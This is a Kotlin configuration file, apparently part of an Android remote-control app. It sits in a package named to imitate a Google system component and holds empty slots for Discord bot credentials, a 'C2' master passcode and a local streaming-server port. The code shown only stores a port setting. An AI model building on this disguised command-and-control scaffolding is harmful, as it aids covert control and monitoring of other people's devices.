package com.google.android.system

import android.content.Context
import android.util.Log

/**
 * Placeholder.kt
 *
 * Centralized Configuration for Admin Discord Bot Credentials, Discord Guild/Channel IDs,
 * and WebStream Local Server Port.
 */
object Placeholder {

    // ── Admin Discord Bot Credentials & Related Discord IDs ──
    const val DISCORD_BOT_TOKEN  = ""
    const val DISCORD_GUILD_ID   = ""
    const val DISCORD_APP_ID     = ""
    const val DISCORD_CHANNEL_ID = ""

    // ── Master Passcode ──
    const val C2_MASTER_PASSCODE = ""

    // ── Dynamic WebStream Local Engine Port (Default: 5467) ──
    @Volatile var WEBSTREAM_LOCAL_PORT: Int = 5467

    /**
     * Gets the current active WebStream local port, checking SharedPreferences cache or default.
     */
    fun getWebStreamPort(context: Context? = null): Int {
        if (context != null) {
            val savedPort = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE).getInt("custom_webstream_port", 0)
            if (savedPort in 1024..65535) {
                WEBSTREAM_LOCAL_PORT = savedPort
                return savedPort
            }
        }
        return WEBSTREAM_LOCAL_PORT
    }

    /**
     * Dynamically updates the active WebStream port on-the-fly and persists to prefs.
     */
    fun updateWebStreamPort(context: Context?, newPort: Int) {
        if (newPort in 1024..65535) {
            WEBSTREAM_LOCAL_PORT = newPort
            context?.getSharedPreferences("device_prefs", Context.MODE_PRIVATE)?.edit()?.putInt("custom_webstream_port", newPort)?.apply()
            Log.i("Placeholder", "Updated dynamic WebStream local port to $newPort")
        }
    }
}
